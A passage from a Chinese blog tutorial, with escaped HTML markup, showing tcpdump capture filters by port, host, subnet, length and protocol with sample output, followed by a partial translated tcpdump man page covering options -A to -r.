# tcpdump -i any -n -nn port &lt;span&gt;111&lt;/span&gt; or port &lt;span&gt;443&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;针对多个主机抓包&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
# tcpdump -i any -n -nn host www.baidu.com or www.&lt;span&gt;360&lt;/span&gt;.com
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;其他示例：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;抓取访问destination 443端口的包&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;1&lt;/span&gt; # tcpdump -i any -n dst port &lt;span&gt;443&lt;/span&gt;   # 然后我们做一个curl https:&lt;span&gt;//&lt;/span&gt;&lt;span&gt;www.baidu.com的操作&lt;/span&gt;
&lt;span&gt;2&lt;/span&gt; &lt;span&gt;…………
&lt;/span&gt;&lt;span&gt;3&lt;/span&gt; &lt;span&gt;19&lt;/span&gt;:&lt;span&gt;22&lt;/span&gt;:&lt;span&gt;43.049262&lt;/span&gt; IP &lt;span&gt;120.27&lt;/span&gt;.&lt;span&gt;48.179&lt;/span&gt;.&lt;span&gt;45008&lt;/span&gt; &amp;gt; &lt;span&gt;180.101&lt;/span&gt;.&lt;span&gt;49.11&lt;/span&gt;.https: Flags [.], ack &lt;span&gt;2997781737&lt;/span&gt;, win &lt;span&gt;229&lt;/span&gt;, length &lt;span&gt;0&lt;/span&gt;
&lt;span&gt;4&lt;/span&gt; …………
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;抓取源端口是80的包&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;44&quot;&gt;
&lt;pre&gt;
&lt;span&gt;1&lt;/span&gt; # tcpdump -i any -nn src port &lt;span&gt;80&lt;/span&gt; 
&lt;span&gt;2&lt;/span&gt; tcpdump: verbose output suppressed, use -v or -vv &lt;span&gt;for&lt;/span&gt;&lt;span&gt; full protocol decode
&lt;/span&gt;&lt;span&gt;3&lt;/span&gt; listening on any, link-type LINUX_SLL (Linux cooked), capture size &lt;span&gt;262144&lt;/span&gt;&lt;span&gt; bytes
&lt;/span&gt;&lt;span&gt;4&lt;/span&gt; &lt;span&gt;19&lt;/span&gt;:&lt;span&gt;32&lt;/span&gt;:&lt;span&gt;45.325115&lt;/span&gt; IP &lt;span&gt;100.100&lt;/span&gt;.&lt;span&gt;45.131&lt;/span&gt;.&lt;span&gt;80&lt;/span&gt; &amp;gt; &lt;span&gt;10.80&lt;/span&gt;.&lt;span&gt;151.139&lt;/span&gt;.&lt;span&gt;48500&lt;/span&gt;: Flags [.], ack &lt;span&gt;2072960929&lt;/span&gt;, win &lt;span&gt;2915&lt;/span&gt;, length &lt;span&gt;0&lt;/span&gt;
&lt;span&gt;5&lt;/span&gt; &lt;span&gt;19&lt;/span&gt;:&lt;span&gt;32&lt;/span&gt;:&lt;span&gt;51.151735&lt;/span&gt; IP &lt;span&gt;100.100&lt;/span&gt;.&lt;span&gt;45.131&lt;/span&gt;.&lt;span&gt;80&lt;/span&gt; &amp;gt; &lt;span&gt;10.80&lt;/span&gt;.&lt;span&gt;151.139&lt;/span&gt;.&lt;span&gt;48500&lt;/span&gt;: Flags [.], ack &lt;span&gt;959&lt;/span&gt;, win &lt;span&gt;2915&lt;/span&gt;, length &lt;span&gt;0&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;抓取源或者目标端口都是80的包&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;49&quot;&gt;
&lt;pre&gt;
&lt;span&gt;1&lt;/span&gt; # tcpdump -i any -n -nn port &lt;span&gt;80&lt;/span&gt;
&lt;span&gt;2&lt;/span&gt; &lt;span&gt;19&lt;/span&gt;:&lt;span&gt;35&lt;/span&gt;:&lt;span&gt;19.465908&lt;/span&gt; IP &lt;span&gt;120.27&lt;/span&gt;.&lt;span&gt;48.179&lt;/span&gt;.&lt;span&gt;40640&lt;/span&gt; &amp;gt; &lt;span&gt;180.101&lt;/span&gt;.&lt;span&gt;49.11&lt;/span&gt;.&lt;span&gt;80&lt;/span&gt;: Flags [P.], &lt;span&gt;seq&lt;/span&gt; &lt;span&gt;1&lt;/span&gt;:&lt;span&gt;78&lt;/span&gt;, ack &lt;span&gt;1&lt;/span&gt;, win &lt;span&gt;229&lt;/span&gt;, length &lt;span&gt;77&lt;/span&gt;: HTTP: GET / HTTP/&lt;span&gt;1.1&lt;/span&gt;
&lt;span&gt;3&lt;/span&gt; &lt;span&gt;19&lt;/span&gt;:&lt;span&gt;35&lt;/span&gt;:&lt;span&gt;19.487790&lt;/span&gt; IP &lt;span&gt;180.101&lt;/span&gt;.&lt;span&gt;49.11&lt;/span&gt;.&lt;span&gt;80&lt;/span&gt; &amp;gt; &lt;span&gt;120.27&lt;/span&gt;.&lt;span&gt;48.179&lt;/span&gt;.&lt;span&gt;40640&lt;/span&gt;: Flags [.], ack &lt;span&gt;78&lt;/span&gt;, win &lt;span&gt;908&lt;/span&gt;, length &lt;span&gt;0&lt;/span&gt;
&lt;span&gt;4&lt;/span&gt; &lt;span&gt;19&lt;/span&gt;:&lt;span&gt;35&lt;/span&gt;:&lt;span&gt;19.488832&lt;/span&gt; IP &lt;span&gt;180.101&lt;/span&gt;.&lt;span&gt;49.11&lt;/span&gt;.&lt;span&gt;80&lt;/span&gt; &amp;gt; &lt;span&gt;120.27&lt;/span&gt;.&lt;span&gt;48.179&lt;/span&gt;.&lt;span&gt;40640&lt;/span&gt;: Flags [P.], &lt;span&gt;seq&lt;/span&gt; &lt;span&gt;1&lt;/span&gt;:&lt;span&gt;2782&lt;/span&gt;, ack &lt;span&gt;78&lt;/span&gt;, win &lt;span&gt;908&lt;/span&gt;, length &lt;span&gt;2781&lt;/span&gt;: HTTP: HTTP/&lt;span&gt;1.1&lt;/span&gt; &lt;span&gt;200&lt;/span&gt;&lt;span&gt; OK
&lt;/span&gt;&lt;span&gt;5&lt;/span&gt; &lt;span&gt;19&lt;/span&gt;:&lt;span&gt;35&lt;/span&gt;:&lt;span&gt;19.488857&lt;/span&gt; IP &lt;span&gt;120.27&lt;/span&gt;.&lt;span&gt;48.179&lt;/span&gt;.&lt;span&gt;40640&lt;/span&gt; &amp;gt; &lt;span&gt;180.101&lt;/span&gt;.&lt;span&gt;49.11&lt;/span&gt;.&lt;span&gt;80&lt;/span&gt;: Flags [.], ack &lt;span&gt;2782&lt;/span&gt;, win &lt;span&gt;272&lt;/span&gt;, length &lt;span&gt;0&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;表示抓取destination prot 在100到455之间的端口的数据&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;59&quot;&gt;
&lt;pre&gt;
&lt;span&gt;1&lt;/span&gt; # tcpdump -i any -n -nn dst portrange &lt;span&gt;100&lt;/span&gt;-&lt;span&gt;455&lt;/span&gt;  # 在另外的面做curl https:&lt;span&gt;//&lt;/span&gt;&lt;span&gt;www.baidu.com 以及 telnet www.baidu.com 111&lt;/span&gt;
&lt;span&gt;2&lt;/span&gt; &lt;span&gt;## 部分信息如下
&lt;/span&gt;&lt;span&gt;3&lt;/span&gt; &lt;span&gt;19&lt;/span&gt;:&lt;span&gt;41&lt;/span&gt;:&lt;span&gt;29.534311&lt;/span&gt; IP &lt;span&gt;120.27&lt;/span&gt;.&lt;span&gt;48.179&lt;/span&gt;.&lt;span&gt;45588&lt;/span&gt; &amp;gt; &lt;span&gt;180.101&lt;/span&gt;.&lt;span&gt;49.11&lt;/span&gt;.&lt;span&gt;443&lt;/span&gt;: Flags [S], &lt;span&gt;seq&lt;/span&gt; &lt;span&gt;956630279&lt;/span&gt;, win &lt;span&gt;29200&lt;/span&gt;, options [mss &lt;span&gt;1460&lt;/span&gt;&lt;span&gt;,sackOK,…………
&lt;/span&gt;&lt;span&gt;4&lt;/span&gt; &lt;span&gt;19&lt;/span&gt;:&lt;span&gt;41&lt;/span&gt;:&lt;span&gt;29.550033&lt;/span&gt; IP &lt;span&gt;120.27&lt;/span&gt;.&lt;span&gt;48.179&lt;/span&gt;.&lt;span&gt;45588&lt;/span&gt; &amp;gt; &lt;span&gt;180.101&lt;/span&gt;.&lt;span&gt;49.11&lt;/span&gt;.&lt;span&gt;443&lt;/span&gt;: Flags [.], ack &lt;span&gt;2690465329&lt;/span&gt;, win &lt;span&gt;229&lt;/span&gt;, length &lt;span&gt;0&lt;/span&gt;
&lt;span&gt;5&lt;/span&gt; &lt;span&gt;…………
&lt;/span&gt;&lt;span&gt;6&lt;/span&gt; &lt;span&gt;19&lt;/span&gt;:&lt;span&gt;41&lt;/span&gt;:&lt;span&gt;37.128895&lt;/span&gt; IP &lt;span&gt;120.27&lt;/span&gt;.&lt;span&gt;48.179&lt;/span&gt;.&lt;span&gt;38202&lt;/span&gt; &amp;gt; &lt;span&gt;180.101&lt;/span&gt;.&lt;span&gt;49.11&lt;/span&gt;.&lt;span&gt;111&lt;/span&gt;: Flags [S], &lt;span&gt;seq&lt;/span&gt; &lt;span&gt;946466181&lt;/span&gt;, win &lt;span&gt;29200&lt;/span&gt;, options [mss &lt;span&gt;1460&lt;/span&gt;,sackOK,TS val &lt;span&gt;732615405&lt;/span&gt; ecr &lt;span&gt;0&lt;/span&gt;,nop,wscale &lt;span&gt;7&lt;/span&gt;], length &lt;span&gt;0&lt;/span&gt;
&lt;span&gt;7&lt;/span&gt; &lt;span&gt;19&lt;/span&gt;:&lt;span&gt;41&lt;/span&gt;:&lt;span&gt;38.131297&lt;/span&gt; IP &lt;span&gt;120.27&lt;/span&gt;.&lt;span&gt;48.179&lt;/span&gt;.&lt;span&gt;38202&lt;/span&gt; &amp;gt; &lt;span&gt;180.101&lt;/span&gt;.&lt;span&gt;49.11&lt;/span&gt;.&lt;span&gt;111&lt;/span&gt;: Flags [S], &lt;span&gt;seq&lt;/span&gt; &lt;span&gt;946466181&lt;/span&gt;, win &lt;span&gt;29200&lt;/span&gt;, options [mss &lt;span&gt;1460&lt;/span&gt;,sackOK,TS val &lt;span&gt;732616408&lt;/span&gt; ecr &lt;span&gt;0&lt;/span&gt;,nop,wscale &lt;span&gt;7&lt;/span&gt;], length &lt;span&gt;0&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;抓取源的端口是20-80的包&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
# tcpdump -i any -n src portrange &lt;span&gt;20&lt;/span&gt;-&lt;span&gt;80&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;抓取端口是20-80的包，不考虑源或目标&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
# tcpdump -i any -n portrange &lt;span&gt;20&lt;/span&gt;-&lt;span&gt;80&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;抓取destination为 www.baidu.com 的包&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
# tcpdump -i any dst www.baidu.com   # 然后ping www.baidu.com ,以及 curl www.baidu.com
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;抓取destination为192.168.1.[0-255]的包&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
# tcpdump -i any -n -nn dst &lt;span&gt;192.168&lt;/span&gt;.&lt;span&gt;1&lt;/span&gt;   # 可以指定范围  ★★★★★ 注意用法  不是一个完整的IP地址
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;抓取source为192.168.*.* 的包&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
# tcpdump -i any -n -nn src host &lt;span&gt;192.168&lt;/span&gt;  # 等价于 tcpdump -i any -n -nn src &lt;span&gt;192.168&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;抓取192.168的包(不管是source还是destination )&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
# tcpdump -i any -n -nn host &lt;span&gt;192.168&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;抓取包长度小于800的包&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
# tcpdump -i any -n -nn &lt;span&gt;less&lt;/span&gt; &lt;span&gt;800&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;抓取包长度大于800的包&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
# tcpdump -i any -n -nn greater &lt;span&gt;800&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;只抓取tcp包&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot;&gt;
&lt;pre&gt;
# tcpdump -i any -n tcp
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;只抓取udp包&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot;&gt;
&lt;pre&gt;
# tcpdump -i any -n udp
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;只抓取icmp的包，internet控制包&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot;&gt;
&lt;pre&gt;
# tcpdump -i any -n icmp
&lt;/pre&gt;&lt;/div&gt;


&lt;div class=&quot;cnblogs_code&quot;&gt;
&lt;pre&gt;
# tcpdump option filter
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;option 举例 -n，-i any 等&lt;/p&gt;
&lt;p&gt;filter 是过滤包的条件，举例：tcp，portrange 1-1000，src port 58895，host &lt;a href=&quot;http://www.itshouce.com.cn/&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;www.itshouce.com.cn&lt;/a&gt;,&lt;/p&gt;
&lt;p&gt;filter可以进行组合 比如：dst port 3306 and src port 58895，portrange 1-1000 or src port 58895 not dst port 3306&lt;/p&gt;
&lt;p&gt;option filter 举例：tcpdump -i any -n portrange 1-3306 or portrange 10000-58895&lt;/p&gt;


&lt;p&gt;参见：&lt;span&gt;&lt;strong&gt;man tcpdump&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;211&quot;&gt;
&lt;pre&gt;
&lt;span&gt;  1&lt;/span&gt; -A  以ASCII码方式显示每一个数据包(不会显示数据包中链路层头部信息). 在抓取包含网页数据的数据包时, 可方便查看数据(nt: 即Handy &lt;span&gt;for&lt;/span&gt;&lt;span&gt; capturing web pages).
&lt;/span&gt;&lt;span&gt;  2&lt;/span&gt; 
&lt;span&gt;  3&lt;/span&gt; -B buffer_size/--buffer-size=&lt;span&gt;buffer_size
&lt;/span&gt;&lt;span&gt;  4&lt;/span&gt; &lt;span&gt;将操作系统捕获缓冲区大小设置为buffer_size，单位为KiB(1024字节)。
&lt;/span&gt;&lt;span&gt;  5&lt;/span&gt; 
&lt;span&gt;  6&lt;/span&gt; -&lt;span&gt;c  count
&lt;/span&gt;&lt;span&gt;  7&lt;/span&gt; &lt;span&gt;    tcpdump将在接受到count个数据包后退出.
&lt;/span&gt;&lt;span&gt;  8&lt;/span&gt; 
&lt;span&gt;  9&lt;/span&gt; -C  &lt;span&gt;file&lt;/span&gt;-size (nt: 此选项用于配合 -&lt;span&gt;w&lt;/span&gt; &lt;span&gt;file&lt;/span&gt;&lt;span&gt; 选项使用)
&lt;/span&gt;&lt;span&gt; 10&lt;/span&gt; 该选项使得tcpdump 在把原始数据包直接保存到文件中之前, 检查此文件大小是否超过file-size. 如果超过了, 将关闭此文件,另创一个文件继续用于原始数据包的记录. 新创建的文件名与 -&lt;span&gt;w&lt;/span&gt; 选项指定的文件名一致, 但文件名后多了一个数字.该数字会从1开始随着新创建文件的增多而增加. &lt;span&gt;file&lt;/span&gt;-size的单位是百万字节(nt: 这里指1,&lt;span&gt;000&lt;/span&gt;,000个字节,并非1,&lt;span&gt;048&lt;/span&gt;,576个字节, 后者是以1024字节为1k, 1024k字节为1M计算所得, 即1M=&lt;span&gt;1024&lt;/span&gt; ＊ &lt;span&gt;1024&lt;/span&gt; ＝ &lt;span&gt;1&lt;/span&gt;,&lt;span&gt;048&lt;/span&gt;,&lt;span&gt;576&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt; 11&lt;/span&gt; # tcpdump -C &lt;span&gt;1&lt;/span&gt; -&lt;span&gt;w&lt;/span&gt;&lt;span&gt; a.cap
&lt;/span&gt;&lt;span&gt; 12&lt;/span&gt; 
&lt;span&gt; 13&lt;/span&gt; -d  以容易阅读的形式,在标准输出上打印出编排过的包匹配码, 随后tcpdump停止.(nt | rt: human readable, 容易阅读的,通常是指以ascii码来打印一些信息. compiled, 编排过的. packet-&lt;span&gt;matching code, 包匹配码,含义未知, 需补充)
&lt;/span&gt;&lt;span&gt; 14&lt;/span&gt; 
&lt;span&gt; 15&lt;/span&gt; -&lt;span&gt;dd&lt;/span&gt;&lt;span&gt; 以C语言的形式打印出包匹配码.
&lt;/span&gt;&lt;span&gt; 16&lt;/span&gt; 
&lt;span&gt; 17&lt;/span&gt; -ddd 以十进制数的形式打印出包匹配码(会在包匹配码之前有一个附加的&lt;span&gt;'&lt;/span&gt;&lt;span&gt;count&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;前缀).
&lt;/span&gt;&lt;span&gt; 18&lt;/span&gt; 
&lt;span&gt; 19&lt;/span&gt; -D  ★★★★★打印系统中所有tcpdump可以在其上进行抓包的网络接口. 每一个接口会打印出数字编号, 相应的接口名字, 以及可能的一个网络接口描述. 其中网络接口名字和数字编号可以用在tcpdump 的-&lt;span&gt;i flag 选项(nt: 把名字或数字代替flag), 来指定要在其上抓包的网络接口.
&lt;/span&gt;&lt;span&gt; 20&lt;/span&gt; 
&lt;span&gt; 21&lt;/span&gt; -&lt;span&gt;e  每行的打印输出中将包括数据包的数据链路层头部信息
&lt;/span&gt;&lt;span&gt; 22&lt;/span&gt; 
&lt;span&gt; 23&lt;/span&gt; -&lt;span&gt;E  spi@ipaddr algo:secret,...
&lt;/span&gt;&lt;span&gt; 24&lt;/span&gt; 
&lt;span&gt; 25&lt;/span&gt;     可通过spi@ipaddr algo:secret 来解密IPsec ESP包(nt |&lt;span&gt; rt:IPsec Encapsulating Security Payload,IPsec 封装安全负载, IPsec可理解为, 一整套对ip数据包的加密协议, ESP 为整个IP 数据包或其中上层协议部分被加密后的数据,前者的工作模式称为隧道模式; 后者的工作模式称为传输模式 . 工作原理, 另需补充).
&lt;/span&gt;&lt;span&gt; 26&lt;/span&gt; 
&lt;span&gt; 27&lt;/span&gt; &lt;span&gt;    需要注意的是, 在终端启动tcpdump 时, 可以为IPv4 ESP packets 设置密钥(secret）.
&lt;/span&gt;&lt;span&gt; 28&lt;/span&gt; 
&lt;span&gt; 29&lt;/span&gt;     可用于加密的算法包括des-cbc, 3des-cbc, blowfish-cbc, rc3-cbc, cast128-cbc, 或者没有(none).默认的是des-&lt;span&gt;cbc(nt: des, Data Encryption Standard, 数据加密标准, 加密算法未知, 另需补充).secret 为用于ESP 的密钥, 使用ASCII 字符串方式表达. 如果以 0x 开头, 该密钥将以16进制方式读入.
&lt;/span&gt;&lt;span&gt; 30&lt;/span&gt; 
&lt;span&gt; 31&lt;/span&gt; &lt;span&gt;    该选项中ESP 的定义遵循RFC2406, 而不是 RFC1827. 并且, 此选项只是用来调试的, 不推荐以真实密钥(secret)来使用该选项, 因为这样不安全: 在命令行中输入的secret 可以被其他人通过ps 等命令查看到.
&lt;/span&gt;&lt;span&gt; 32&lt;/span&gt; 
&lt;span&gt; 33&lt;/span&gt; &lt;span&gt;    除了以上的语法格式(nt: 指spi@ipaddr algo:secret), 还可以在后面添加一个语法输入文件名字供tcpdump 使用(nt：即把spi@ipaddr algo:secret,... 中...换成一个语法文件名). 此文件在接受到第一个ESP　包时会打开此文件, 所以最好此时把赋予tcpdump 的一些特权取消(nt: 可理解为, 这样防范之后, 当该文件为恶意编写时,不至于造成过大损害).
&lt;/span&gt;&lt;span&gt; 34&lt;/span&gt; 
&lt;span&gt; 35&lt;/span&gt; -&lt;span&gt;f  显示外部的IPv4 地址时(nt: foreign IPv4 addresses, 可理解为, 非本机ip地址), 采用数字方式而不是名字.(此选项是用来对付Sun公司的NIS服务器的缺陷(nt: NIS, 网络信息服务, tcpdump 显示外部地址的名字时会用到她提供的名称服务): 此NIS服务器在查询非本地地址名字时,常常会陷入无尽的查询循环).
&lt;/span&gt;&lt;span&gt; 36&lt;/span&gt; 
&lt;span&gt; 37&lt;/span&gt;     由于对外部(foreign)IPv4地址的测试需要用到本地网络接口(nt: tcpdump 抓包时用到的接口)及其IPv4 地址和网络掩码. 如果此地址或网络掩码不可用, 或者此接口根本就没有设置相应网络地址和网络掩码(nt: linux 下的 &lt;span&gt;'&lt;/span&gt;&lt;span&gt;any&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; 网络接口就不需要设置地址和掩码, 不过此&lt;span&gt;'&lt;/span&gt;&lt;span&gt;any&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;接口可以收到系统中所有接口的数据包), 该选项不能正常工作.
&lt;/span&gt;&lt;span&gt; 38&lt;/span&gt; 
&lt;span&gt; 39&lt;/span&gt; -F  &lt;span&gt;file&lt;/span&gt;
&lt;span&gt; 40&lt;/span&gt; &lt;span&gt;    使用file 文件作为过滤条件表达式的输入, 此时命令行上的输入将被忽略.
&lt;/span&gt;&lt;span&gt; 41&lt;/span&gt; 
&lt;span&gt; 42&lt;/span&gt; -&lt;span&gt;i  interface
&lt;/span&gt;&lt;span&gt; 43&lt;/span&gt; &lt;span&gt;    ★★★★★指定tcpdump 需要监听的接口.  如果没有指定, tcpdump 会从系统接口列表中搜寻编号最小的已配置好的接口(不包括 loopback 接口).一但找到第一个符合条件的接口, 搜寻马上结束.
&lt;/span&gt;&lt;span&gt; 44&lt;/span&gt; 
&lt;span&gt; 45&lt;/span&gt;     在采用2.2版本或之后版本内核的Linux 操作系统上, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;any&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; 这个虚拟网络接口可被用来接收所有网络接口上的数据包(nt: 这会包括目的是该网络接口的, 也包括目的不是该网络接口的). 需要注意的是如果真实网络接口不能工作在&lt;span&gt;'&lt;/span&gt;&lt;span&gt;混杂&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;模式(promiscuous)下,则无法在&lt;span&gt;'&lt;/span&gt;&lt;span&gt;any&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;这个虚拟的网络接口上抓取其数据包.
&lt;/span&gt;&lt;span&gt; 46&lt;/span&gt; 
&lt;span&gt; 47&lt;/span&gt;     如果 -&lt;span&gt;D 标志被指定, tcpdump会打印系统中的接口编号，而该编号就可用于此处的interface 参数.
&lt;/span&gt;&lt;span&gt; 48&lt;/span&gt; 
&lt;span&gt; 49&lt;/span&gt; -&lt;span&gt;l  对标准输出进行行缓冲(nt: 使标准输出设备遇到一个换行符就马上把这行的内容打印出来).在需要同时观察抓包打印以及保存抓包记录的时候很有用. 比如, 可通过以下命令组合来达到此目的:
&lt;/span&gt;&lt;span&gt; 50&lt;/span&gt;     tcpdump  -l | &lt;span&gt;tee&lt;/span&gt; dat 或者 tcpdump  -l &amp;gt; dat &amp;amp; &lt;span&gt;tail&lt;/span&gt; -f dat (nt: 前者使用tee来把tcpdump 的输出同时放到文件dat和标准输出中, 而后者通过重定向操作&lt;span&gt;'&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, 把tcpdump的输出放到dat 文件中, 同时通过tail把dat文件中的内容放到标准输出中)
&lt;/span&gt;&lt;span&gt; 51&lt;/span&gt; 
&lt;span&gt; 52&lt;/span&gt; -L  列出指定网络接口所支持的数据链路层的类型后退出.(nt: 指定接口通过-&lt;span&gt;i 来指定)
&lt;/span&gt;&lt;span&gt; 53&lt;/span&gt; 
&lt;span&gt; 54&lt;/span&gt; -&lt;span&gt;m  module
&lt;/span&gt;&lt;span&gt; 55&lt;/span&gt; &lt;span&gt;    通过module 指定的file 装载SMI MIB 模块(nt: SMI，Structure of Management Information, 管理信息结构MIB, Management Information Base, 管理信息库. 可理解为, 这两者用于SNMP(Simple Network Management Protoco)协议数据包的抓取. 具体SNMP 的工作原理未知, 另需补充).
&lt;/span&gt;&lt;span&gt; 56&lt;/span&gt; 
&lt;span&gt; 57&lt;/span&gt; &lt;span&gt;    此选项可多次使用, 从而为tcpdump 装载不同的MIB 模块.
&lt;/span&gt;&lt;span&gt; 58&lt;/span&gt; 
&lt;span&gt; 59&lt;/span&gt; -M  secret  如果TCP 数据包(TCP segments)有TCP-&lt;span&gt;MD5选项(在RFC 2385有相关描述), 则为其摘要的验证指定一个公共的密钥secret.
&lt;/span&gt;&lt;span&gt; 60&lt;/span&gt; 
&lt;span&gt; 61&lt;/span&gt; -&lt;span&gt;n  ★★★★★不将主机网络地址转换为名称。
&lt;/span&gt;&lt;span&gt; 62&lt;/span&gt; 
&lt;span&gt; 63&lt;/span&gt; -&lt;span&gt;nn  ★★★★★不将协议和端口号等转换成名称。
&lt;/span&gt;&lt;span&gt; 64&lt;/span&gt; 
&lt;span&gt; 65&lt;/span&gt; -N  不打印出host 的域名部分. 比如, 如果设置了此选现, tcpdump 将会打印&lt;span&gt;'&lt;/span&gt;&lt;span&gt;nic&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; 而不是 &lt;span&gt;'&lt;/span&gt;&lt;span&gt;nic.ddn.mil&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;.
&lt;/span&gt;&lt;span&gt; 66&lt;/span&gt; 
&lt;span&gt; 67&lt;/span&gt; -#/--&lt;span&gt;number  在行的开头打印一个数据包序号。
&lt;/span&gt;&lt;span&gt; 68&lt;/span&gt; 
&lt;span&gt; 69&lt;/span&gt; -&lt;span&gt;O  不运行包匹配编码优化器。当怀疑某些bug是由优化代码引起的, 此选项将很有用.
&lt;/span&gt;&lt;span&gt; 70&lt;/span&gt; 
&lt;span&gt; 71&lt;/span&gt; -p  一般情况下, 把网络接口设置为非&lt;span&gt;'&lt;/span&gt;&lt;span&gt;混杂&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;模式. 但必须注意 , 在特殊情况下此网络接口还是会以&lt;span&gt;'&lt;/span&gt;&lt;span&gt;混杂&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;模式来工作； 从而, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;-p&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; 的设与不设, 不能当做以下选现的代名词:&lt;span&gt;'&lt;/span&gt;&lt;span&gt;ether host {local-hw-add}&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; 或  &lt;span&gt;'&lt;/span&gt;&lt;span&gt;ether broadcast&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;(nt: 前者表示只匹配以太网地址为host 的包, 后者表示匹配以太网地址为广播地址的数据包).
&lt;/span&gt;&lt;span&gt; 72&lt;/span&gt; 
&lt;span&gt; 73&lt;/span&gt; -Q|-P direction/--direction=direction   选择发送/接收方向 direction 应该捕获数据包的方向。可能的值是 &lt;span&gt;in&lt;/span&gt;&lt;span&gt;、out和 inout。并非所有平台都可用。
&lt;/span&gt;&lt;span&gt; 74&lt;/span&gt; 
&lt;span&gt; 75&lt;/span&gt; -q  快速(安静?&lt;span&gt;)输出。打印更少的协议信息，因此输出行更短。
&lt;/span&gt;&lt;span&gt; 76&lt;/span&gt; 
&lt;span&gt; 77&lt;/span&gt; -R  设定tcpdump 对 ESP/AH 数据包的解析按照 RFC1825而不是RFC1829(nt: AH, 认证头, ESP， 安全负载封装, 这两者会用在IP包的安全传输机制中). 如果此选项被设置, tcpdump 将不会打印出&lt;span&gt;'&lt;/span&gt;&lt;span&gt;禁止中继&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;域(nt: relay prevention field). 另外,由于ESP/AH规范中没有规定ESP/AH数据包必须拥有协议版本号域,所以tcpdump不能从收到的ESP/&lt;span&gt;AH数据包中推导出协议版本号.
&lt;/span&gt;&lt;span&gt; 78&lt;/span&gt; 
&lt;span&gt; 79&lt;/span&gt; -r  &lt;span&gt;file&lt;/span&gt;
&lt;span&gt; 80&lt;/span&gt;     从文件file 中读取包数据. 如果file 字段为 &lt;span&gt;'&lt;/span&gt;&lt;span&gt;-&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt; 符号, 则tcpdump 会从标准输入中读取包数据.
&lt;/span&gt;&lt;span&gt; 81&lt;/span&gt; # tcpdump -n -&lt;span&gt;r a.cap
&lt;/span&gt;&lt;span&gt; 82&lt;/span&gt; 
